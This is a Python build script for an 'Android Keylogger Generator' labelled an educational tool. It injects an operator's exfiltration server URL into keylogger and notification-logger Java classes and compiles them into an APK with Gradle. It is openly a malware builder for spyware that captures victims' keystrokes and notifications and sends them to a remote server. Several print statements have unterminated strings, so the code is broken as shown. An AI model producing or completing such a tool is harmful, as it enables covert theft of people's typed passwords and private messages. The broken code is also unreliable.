import argparse
import subprocess
import os
import shutil

def modify_code(project_dir, server_url):
    """
    """
    if not server_url:
        print("[+]No server Url Fouund (Skipping URL injection)")
        return

    print(f"[+] Server URL injecting... {server_url}")
    
   
    base_java_path = os.path.join(project_dir, "app", "src", "main", "java", "com", "example", "keylogger")
    
    files_to_modify = [
        os.path.join(base_java_path, "KeyLoggerService.java"),
        os.path.join(base_java_path, "NotificationLogger.java")
    ]

   
    target_string = 'private static final String SERVER_URL = "YOUR_SERVER_URL";'
   
    replacement_string = f'private static final String SERVER_URL = "{server_url}";'

    for file_path in files_to_modify:
        if not os.path.exists(file_path):
            print(f"[!] Error: FIle not found: {file_path}")
            print("[!] IS this ok com.example.keylogger
            continue
            
        try:
           
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()

            if target_string in content:
                content = content.replace(target_string, replacement_string)
                
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(content)
                
                print(f"[+] URL Updated {os.path.basename(file_path)}")
            else:
                print(f"[!] Warning: {os.path.basename(file_path)}  'YOUR_SERVER_URL' Not found")
                
        except Exception as e:
            print(f"[!] Error: File {file_path} not configure {e}")
            raise

def build_apk(project_dir, output_apk):
    """
    
    """
    print("[+] Gradle use for genrate apk wait some time :
    
    try:
        # 3. Gradle 
        gradle_wrapper = os.path.join(project_dir, "gradlew")
        
        # Windows 'gradlew.bat'
        if os.name == 'nt':
            gradle_wrapper = os.path.join(project_dir, "gradlew.bat")

        # 4.Gradle
       
        build_command = [gradle_wrapper, "-p", project_dir, "assembleDebug"]

        # Gradle  execute
        #  'gradlew'  execute : chmod +x template_apk/gradlew)
        subprocess.run(build_command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='utf-8')
        
        print("[+] Build Success:")
        
        # 5.
        built_apk_path = os.path.join(project_dir, "app", "build", "outputs", "apk", "debug", "app-debug.apk")
        
        shutil.copy(built_apk_path, output_apk)
        print(f"[+] APK Saved: {output_apk}")

    except subprocess.CalledProcessError as e:
        print("[!] Gradle Error")
        print(f"Error: {e.stderr}")
    except FileNotFoundError:
        print(f"[!] APK not found '{built_apk_path}'  )
    except Exception as e:
        print(f"[!] Unknown Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Android Keylogger Generator (AKGen) - Educational Tool")
    parser.add_argument("-o", "--output", required=True, help=" APK    ( akgen_app.apk)")
    parser.add_argument("-s", "--server", help=" URL    ")
    args = parser.parse_args()

    template_dir = "template_apk"

    if not os.path.exists(template_dir):
        print(f"[!] Error: 'template_apk' folder not found।")
        return

   
    try:
        modify_code(template_dir, args.server)
    except Exception:
        print("[!] COdes Error")
        return

    # 2. APK 
    build_apk(template_dir, args.output)

if __name__ == "__main__":
    main()
